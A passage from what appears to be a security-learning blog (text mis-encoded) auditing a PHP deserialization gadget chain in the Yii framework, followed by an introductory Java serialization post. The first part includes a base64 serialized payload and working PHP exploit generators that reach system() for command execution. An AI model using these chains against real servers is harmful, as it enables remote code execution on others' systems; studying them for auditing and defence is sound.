<h4 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>å…¥å£æ˜¯æˆ‘ä»¬è‡ªå·±å†™çš„<code>Controller</code></p>
<p>ç…§ä¾‹å…¨å±€æœç´¢ä¸€ä¸‹å¯ä»¥åˆ©ç”¨ç‚¹ï¼Œå› ä¸ºå…¥å£å°±å†™äº†ä¸€ä¸ªååºåˆ—åŒ–ï¼Œæ‰€ä»¥å°±å…ˆå»æ‰¾<code>__destruct</code>æˆ–è€…<code>__construct</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Swift_ByteStream_TemporaryFileByteStream::__destruct,Swift_KeyCache_DiskKeyCache::__destructå¯ä»¥è§¦å‘__toString</span><br><span class="line">2.BatchQueryResult::__destructå¯ä»¥è§¦å‘__callæˆ–è€…è°ƒç”¨åˆ°æŸä¸€ä¸ªç±»çš„closeæ–¹æ³•</span><br><span class="line">3.XmlBuilder::__toStringè§¦å‘__call</span><br><span class="line">4.Covers::__toString è§¦å‘ __call æˆ–è€… render</span><br><span class="line">5.Nullable::__toString è§¦å‘__call</span><br><span class="line">6.ExactValueToken::__toString è§¦å‘__call æˆ–è€… stringify</span><br><span class="line">7.LazyString::__toString è§¦å‘ __invoke</span><br><span class="line">8.</span><br><span class="line">â€¦â€¦</span><br></pre></td></tr></table></figure>

<p>å½“ç„¶å¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä¹Ÿå¯ä»¥å…ˆæ‰¾å¯èƒ½å¯ä»¥åˆ©ç”¨çš„ç‚¹å†å»ï¼Œå°±æ¯”å¦‚åœ¨çœ‹çš„æ—¶å€™å‘ç°<code>ActionSequence::run</code>ä¸­å°±å­˜åœ¨æˆ‘ä»¬å¯èƒ½å¯ä»¥åˆ©ç”¨çš„<code>call_user_func_array</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="variable">$context</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;actions <span class="keyword">as</span> <span class="variable">$step</span>) &#123;</span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> $step Action  **/</span></span><br><span class="line">        codecept_debug(<span class="string">&quot;- <span class="subst">$step</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            call_user_func_array([<span class="variable">$context</span>, <span class="variable">$step</span>-&gt;getAction()], <span class="variable">$step</span>-&gt;getArguments());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="variable">$class</span> = get_class(<span class="variable">$e</span>); <span class="comment">// rethrow exception for a specific action</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="variable">$class</span>(<span class="variable">$e</span>-&gt;getMessage() . <span class="string">&quot;\nat <span class="subst">$step</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸è¿‡ç°åœ¨æˆ‘ä»¬å°±å…ˆä»å¤´åˆ°å°¾å§</p>
<p>å°±æ¯”å¦‚ä¸€å¼€å§‹çš„<code>Swift_ByteStream_TemporaryFileByteStream::__destruct</code>å¯ä»¥è§¦å‘<code>__toString</code>ï¼Œå…ˆæ¥æ‰¾è¿™ä¸€ç§çš„é“¾å­å§</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Swift_ByteStream_TemporaryFileByteStream::__destruct</span><br><span class="line">	XmlBuilder::__toString</span><br><span class="line">		Generator::__call</span><br><span class="line">			Generator::format</span><br><span class="line">				Generator::getFormatter</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆæˆ‘ä»¬çœ‹åˆ°<code>Swift_KeyCache_DiskKeyCache::__destruct</code>ï¼Œä¼šè°ƒç”¨åˆ°<code>clearAll</code>ï¼Œå¹¶åœ¨è¯¥æ–¹æ³•é‡Œå¯ä»¥è§¦å‘åˆ°<code>XmlBuilder::__toString</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;keys <span class="keyword">as</span> <span class="variable">$nsKey</span> =&gt; <span class="variable">$null</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;clearAll(<span class="variable">$nsKey</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/d53f38f794a9427bb605ab33d8e496fe.png" alt="img"></p>
<p><code>XmlBuilder::__toString</code>è°ƒç”¨åˆ°<code>saveXML</code>ï¼Œé‚£ä¹ˆå¯èƒ½å¯ä»¥è§¦å‘<code>__call</code>ï¼Œæˆ–è€…æ˜¯å¯ä»¥åˆ©ç”¨çš„<code>saveXML</code>ï¼Œå’±ä»¬å¯ä»¥å…ˆå»æ‰¾<code>__call</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;__dom__-&gt;saveXML();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¼šå‘ç°ä¸€çœ¼çœ‹è¿‡å»æ¯”è¾ƒå¥½åˆ©ç”¨çš„ä¹Ÿå°±åªæœ‰<code>Generator::__call</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è°ƒç”¨åˆ°format $method : saveXML $attributes : null</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$attributes</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format(<span class="variable">$method</span>, <span class="variable">$attributes</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$formatter</span>, <span class="variable">$arguments</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter(<span class="variable">$formatter</span>), <span class="variable">$arguments</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯ä»¥åˆ©ç”¨$this-&gt;formattersæ•°ç»„è¿”å›æˆ‘ä»¬æƒ³è°ƒç”¨çš„æ–¹æ³•</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params"><span class="variable">$formatter</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;providers <span class="keyword">as</span> <span class="variable">$provider</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (method_exists(<span class="variable">$provider</span>, <span class="variable">$formatter</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>] = <span class="keyword">array</span>(<span class="variable">$provider</span>, <span class="variable">$formatter</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">InvalidArgumentException</span>(sprintf(<span class="string">&#x27;Unknown formatter &quot;%s&quot;&#x27;</span>, <span class="variable">$formatter</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=TzozOToiRGlzS2V5Q2FjaGVcU3dpZnRfS2V5Q2FjaGVfRGlza0tleUNhY2hlIjoxOntzOjQ1OiIARGlzS2V5Q2FjaGVcU3dpZnRfS2V5Q2FjaGVfRGlza0tleUNhY2hlAHBhdGgiO086Mjc6IkNvZGVjZXB0aW9uXFV0aWxcWG1sQnVpbGRlciI6MTp7czoxMDoiACoAX19kb21fXyI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEwOiJmb3JtYXR0ZXJzIjthOjE6e3M6Nzoic2F2ZVhNTCI7czo5OiJwaHBpbmZvKCkiO319fX0=</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/6eac1b6197dd46189dafcca9ab839c1f.png" alt="img">â€˜ä¸è¡Œï¼Œæ¢ä¸€ä¸ª</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BatchQueryResult::__destruct</span><br><span class="line">		Generator::__call</span><br><span class="line">			Generator::format</span><br><span class="line">				Generator::getFormatter</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Generator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ameuu</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>;</span><br><span class="line"></span><br><span class="line">var_dump(base64_encode(serialize(<span class="keyword">new</span> BatchQueryResult())));</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/4f9ede86d7824ecbac10a199d3adde59.png" alt="img"></p>
<p>ä½†æ˜¯æˆ‘ä»¬åˆå‘ç°ä¸€ä¸ªé‡è¦é—®é¢˜ï¼Œè¿™é‡Œåªèƒ½æ‰§è¡Œç±»ä¼¼äº<code>phpinfo</code>è¿™æ ·çš„å‡½æ•°ï¼Œæˆ‘ä»¬æ²¡æœ‰åŠæ³•ä¼ å…¥å‚æ•°ï¼Œä¹Ÿåšä¸åˆ°æ— å‚æ•°RCEï¼Œé‚£ä¹ˆåªèƒ½åˆ©ç”¨ç°åœ¨å·²æœ‰çš„é“¾å­ï¼Œè¯•ç€æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„å·²ç»å®šä¹‰å¥½çš„ä¸ç”¨å‚æ•°çš„æ–¹æ³•</p>
<p>æ‰¾åˆ°<code>CreateAction::run</code>ï¼Œç›´æ¥å¯ä»¥åˆ©ç”¨</p>
<p><img src="https://img-blog.csdnimg.cn/4d89bd7310a24c81898ec0d54c8d7c9b.png" alt="img"></p>
<p>æœ€ç»ˆpocï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CreateAction</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$checkAccess</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Generator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(),<span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ameuu</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>;</span><br><span class="line"></span><br><span class="line">var_dump(base64_encode(serialize(<span class="keyword">new</span> BatchQueryResult())));</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/13c6c8954f5e4535b5d5eb941f996011.png" alt="img"></p>
<h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¿™é‡Œä»€ä¹ˆéƒ½æ²¡æœ‰æ~</p>
]]></content>
      <categories>
        <category>æ²¡æœ‰äººæ¯”æˆ‘æ›´çˆ±å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>ThinkPHP</tag>
        <tag>yii</tag>
        <tag>å› ä¸ºä¸çŸ¥é“è¯¥å¹²ä»€ä¹ˆæ‰€ä»¥ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>javaåˆæ­¥å­¦ä¹ </title>
    <url>/2022/03/18/java%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<blockquote>
<p> å› ä¸ºä¸Šå­¦æœŸå­¦äº†javaè¯¾ï¼Œä½†æ˜¯å‘ç°åˆ«çš„ç­è®²äº†åºåˆ—åŒ–å’Œæ­£åˆ™ä¹‹ç±»çš„ï¼Œæ‰€ä»¥æ‰“ç®—å­¦ä¸€ä¸‹</p>
</blockquote>
<h4 id="ä¸€ã€åºåˆ—åŒ–æ¦‚è¿°"><a href="#ä¸€ã€åºåˆ—åŒ–æ¦‚è¿°" class="headerlink" title="ä¸€ã€åºåˆ—åŒ–æ¦‚è¿°"></a>ä¸€ã€åºåˆ—åŒ–æ¦‚è¿°</h4><p>åºåˆ—åŒ–æ˜¯æŒ‡æŠŠä¸€ä¸ªJavaå¯¹è±¡å˜æˆäºŒè¿›åˆ¶å†…å®¹ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªbyte[]æ•°ç»„ã€‚ åºåˆ—åŒ–åå¯ä»¥æŠŠbyte[]ä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼Œæˆ–è€…æŠŠbyte[]é€šè¿‡ç½‘ç»œä¼ è¾“åˆ°è¿œç¨‹ï¼Œè¿™æ ·ï¼Œå°±ç›¸å½“äºæŠŠJavaå¯¹è±¡å­˜å‚¨åˆ°æ–‡ä»¶æˆ–è€…é€šè¿‡ç½‘ç»œä¼ è¾“å‡ºå»äº†ã€‚ æœ‰åºåˆ—åŒ–ï¼Œå°±æœ‰ååºåˆ—åŒ–ï¼Œå³æŠŠä¸€ä¸ªäºŒè¿›åˆ¶å†…å®¹ï¼ˆä¹Ÿå°±æ˜¯byte[]æ•°ç»„ï¼‰å˜å›Javaå¯¹è±¡ã€‚æœ‰äº†ååºåˆ—åŒ–ï¼Œä¿å­˜åˆ°æ–‡ä»¶ä¸­çš„byte[]æ•°ç»„åˆå¯ä»¥â€œå˜å›â€Javaå¯¹è±¡ï¼Œæˆ–è€…ä»ç½‘ç»œä¸Šè¯»å–byte[]å¹¶æŠŠå®ƒâ€œå˜å›â€Javaå¯¹è±¡ã€‚<u>ï¼ˆæ¥æºç½‘ç»œï¼‰</u></p>
<p>åºåˆ—åŒ–æœ€é‡è¦çš„ä½œç”¨ï¼šåœ¨ä¼ é€’å’Œä¿å­˜å¯¹è±¡æ—¶.ä¿è¯å¯¹è±¡çš„å®Œæ•´æ€§å’Œå¯ä¼ é€’æ€§ã€‚å¯¹è±¡è½¬æ¢ä¸ºæœ‰åºå­—èŠ‚æµ,ä»¥ä¾¿åœ¨ç½‘ç»œä¸Šä¼ è¾“æˆ–è€…ä¿å­˜åœ¨æœ¬åœ°æ–‡ä»¶ä¸­ã€‚</p>
<p>ååºåˆ—åŒ–çš„æœ€é‡è¦çš„ä½œç”¨ï¼šæ ¹æ®å­—èŠ‚æµä¸­ä¿å­˜çš„å¯¹è±¡çŠ¶æ€åŠæè¿°ä¿¡æ¯ï¼Œé€šè¿‡ååºåˆ—åŒ–é‡å»ºå¯¹è±¡ã€‚</p>
<p>æ€»ç»“ï¼šæ ¸å¿ƒä½œç”¨å°±æ˜¯å¯¹è±¡çŠ¶æ€çš„ä¿å­˜å’Œé‡å»ºã€‚ï¼ˆæ•´ä¸ªè¿‡ç¨‹æ ¸å¿ƒç‚¹å°±æ˜¯å­—èŠ‚æµä¸­æ‰€ä¿å­˜çš„å¯¹è±¡çŠ¶æ€åŠæè¿°ä¿¡æ¯ï¼‰</p>
<p>ä¾‹å¦‚åœ¨phpä¸­å¦‚æœè¦ä¿å­˜ä¸€ä¸ªç±»ï¼Œå¯ä»¥åˆ©ç”¨åºåˆ—åŒ–å°†ç±»ä¿å­˜æˆäºŒè¿›åˆ¶å†…å®¹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">var_dump(serialize(<span class="keyword">new</span> A()));</span><br><span class="line"></span><br><span class="line"><span class="comment">//string(12) &quot;O:1:&quot;A&quot;:0:&#123;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h4 id="äºŒã€javaåºåˆ—åŒ–"><a href="#äºŒã€javaåºåˆ—åŒ–" class="headerlink" title="äºŒã€javaåºåˆ—åŒ–"></a>äºŒã€javaåºåˆ—åŒ–</h4><blockquote>
<p>java.io.ObjectOutputStreamä»£è¡¨å¯¹è±¡è¾“å‡ºæµï¼Œå®ƒçš„writeObject(Object obj)æ–¹æ³•å¯å¯¹å‚æ•°æŒ‡å®šçš„objå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–ï¼ŒæŠŠå¾—åˆ°çš„å­—èŠ‚åºåˆ—å†™åˆ°ä¸€ä¸ªç›®æ ‡è¾“å‡ºæµä¸­ã€‚<br>java.io.ObjectInputStreamä»£è¡¨å¯¹è±¡è¾“å…¥æµï¼Œå®ƒçš„readObject()æ–¹æ³•ä»ä¸€ä¸ªæºè¾“å…¥æµä¸­è¯»å–å­—èŠ‚åºåˆ—ï¼Œå†æŠŠå®ƒä»¬ååºåˆ—åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶å°†å…¶è¿”å›ã€‚<br>åªæœ‰å®ç°äº†Serializableå’ŒExternalizableæ¥å£çš„ç±»çš„å¯¹è±¡æ‰èƒ½è¢«åºåˆ—åŒ–ã€‚Externalizableæ¥å£ç»§æ‰¿è‡ª Serializableæ¥å£ï¼Œå®ç°Externalizableæ¥å£çš„ç±»å®Œå…¨ç”±è‡ªèº«æ¥æ§åˆ¶åºåˆ—åŒ–çš„è¡Œä¸ºï¼Œè€Œä»…å®ç°Serializableæ¥å£çš„ç±»å¯ä»¥ é‡‡ç”¨é»˜è®¤çš„åºåˆ—åŒ–æ–¹å¼ ã€‚<br>ã€€ã€€å¯¹è±¡åºåˆ—åŒ–åŒ…æ‹¬å¦‚ä¸‹æ­¥éª¤ï¼š<br>ã€€ã€€1ï¼‰ åˆ›å»ºä¸€ä¸ªå¯¹è±¡è¾“å‡ºæµï¼Œå®ƒå¯ä»¥åŒ…è£…ä¸€ä¸ªå…¶ä»–ç±»å‹çš„ç›®æ ‡è¾“å‡ºæµï¼Œå¦‚æ–‡ä»¶è¾“å‡ºæµï¼›<br>ã€€ã€€2ï¼‰ é€šè¿‡å¯¹è±¡è¾“å‡ºæµçš„writeObject()æ–¹æ³•å†™å¯¹è±¡ã€‚</p>
<p>ã€€ã€€å¯¹è±¡ååºåˆ—åŒ–çš„æ­¥éª¤å¦‚ä¸‹ï¼š<br>ã€€ã€€1ï¼‰ åˆ›å»ºä¸€ä¸ªå¯¹è±¡è¾“å…¥æµï¼Œå®ƒå¯ä»¥åŒ…è£…ä¸€ä¸ªå…¶ä»–ç±»å‹çš„æºè¾“å…¥æµï¼Œå¦‚æ–‡ä»¶è¾“å…¥æµï¼›<br>ã€€ã€€2ï¼‰ é€šè¿‡å¯¹è±¡è¾“å…¥æµçš„readObject()æ–¹æ³•è¯»å–å¯¹è±¡ã€‚</p>
</blockquote>
<p>æ‰€ä»¥å¯ä»¥ç”¨ä¸åŒçš„æ–¹å¼å®ç°å¯¹è±¡çš„åºåˆ—åŒ–</p>
<p><a href="https://www.runoob.com/java/java-serialization.html">èœé¸Ÿæ•™ç¨‹</a></p>
<h5 id="1-åˆæ­¥è®¤è¯†javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–"><a href="#1-åˆæ­¥è®¤è¯†javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–" class="headerlink" title="1.åˆæ­¥è®¤è¯†javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–"></a>1.åˆæ­¥è®¤è¯†javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–</h5><p>//ç”¨äºåºåˆ—åŒ–çš„ç±»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">char</span> sex;</span><br><span class="line">    Student(<span class="keyword">int</span> id,String name,<span class="keyword">char</span> sex)&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">char</span> sex)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">getSex</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>//å®ç°åºåˆ—åŒ–</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Student std)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream obj = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;output.txt&quot;</span>));</span><br><span class="line">        obj.writeObject(std);</span><br><span class="line">        System.out.println(<span class="string">&quot;åºåˆ—åŒ–æˆåŠŸï¼&quot;</span>);</span><br><span class="line">        obj.close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ï¿½ï¿½ sr demo.Studentï¿½ï¿½eï¿½(ï¿½ï¿½ I idC sexL namet Ljava/lang/String;xp   Yst Ameuu</span></span><br></pre></td></tr></table></figure>

<p>//å®ç°ååºåˆ—åŒ–</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unSerialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">&quot;output.txt&quot;</span>)));</span><br><span class="line">        Student student = (Student) objectInputStream.readObject();</span><br><span class="line">        System.out.println(student.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;ååºåˆ—åŒ–æˆåŠŸ&quot;</span>);</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2-æ·±å…¥å­¦ä¹ "><a href="#2-æ·±å…¥å­¦ä¹ " class="headerlink" title="2.æ·±å…¥å­¦ä¹ "></a>2.æ·±å…¥å­¦ä¹ </h5><p><a href="https://blog.csdn.net/mocas_wang/article/details/107621010">javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–å…¨è®²è§£</a></p>
<p>åºåˆ—åŒ–æ–¹æ³•ï¼šåŸç”Ÿã€xmlã€jsonç­‰</p>
<ol>
<li>åºåˆ—åŒ–çš„ç±»å¿…é¡»å®ç°Serializeæ¥å£</li>
<li>é™æ€å˜é‡ä¸èƒ½è¢«åºåˆ—åŒ–</li>
<li><code>transient</code>ä¸å‚ä¸åºåˆ—åŒ–</li>
</ol>
